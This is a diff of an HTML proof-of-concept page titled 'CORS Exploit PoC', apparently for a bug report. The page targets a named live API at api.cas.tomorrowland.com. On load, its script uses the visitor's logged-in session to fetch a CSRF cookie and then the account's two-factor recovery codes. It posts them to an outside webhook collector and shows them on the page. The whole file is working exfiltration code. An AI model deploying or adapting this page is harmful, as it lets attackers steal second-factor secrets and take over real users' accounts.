@@ -1,12 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS Exploit PoC</title>
+</head>
+<body>
+
+<h2>CORS Exploit PoC</h2>
+<p>If the victim is logged in, sensitive API responses will be exfiltrated.</p>
+
 <script>
-fetch("https://api.cas.tomorrowland.com/api/user/two-factor-qr-code", {
-    credentials: "include"
-})
-.then(r => r.text())
-.then(data => {
-    fetch("https://d90c361b-91e4-4399-8c78-7b57e7743bca.webhooksite.net/", {
-        method: "POST",
-        body: data
-    });
-});
+async function exploit() {
+
+  // Step 1: Initialize Sanctum session
+  await fetch("https://api.cas.tomorrowland.com/sanctum/csrf-cookie", {
+    method: "GET",
+    credentials: "include",
+    headers: {
+      "Accept": "application/json",
+      "X-Requested-With": "XMLHttpRequest"
+    }
+  });
+
+  // Step 2: Access authenticated endpoint
+  const response = await fetch(
+    "https://api.cas.tomorrowland.com/api/user/two-factor-recovery-codes",
+    {
+      method: "GET",
+      credentials: "include",
+      headers: {
+        "Accept": "application/json",
+        "X-Requested-With": "XMLHttpRequest"
+      }
+    }
+  );
+
+  const data = await response.text();
+
+  // Step 3: Exfiltrate response
+  fetch("https://d90c361b-91e4-4399-8c78-7b57e7743bca.webhooksite.net/", {
+    method: "POST",
+    body: data
+  });
+
+  // Display result in browser (for demo)
+  document.body.innerHTML += "<pre>" + data + "</pre>";
+}
+
+exploit();
 </script>
+
+</body>
+</html>
+
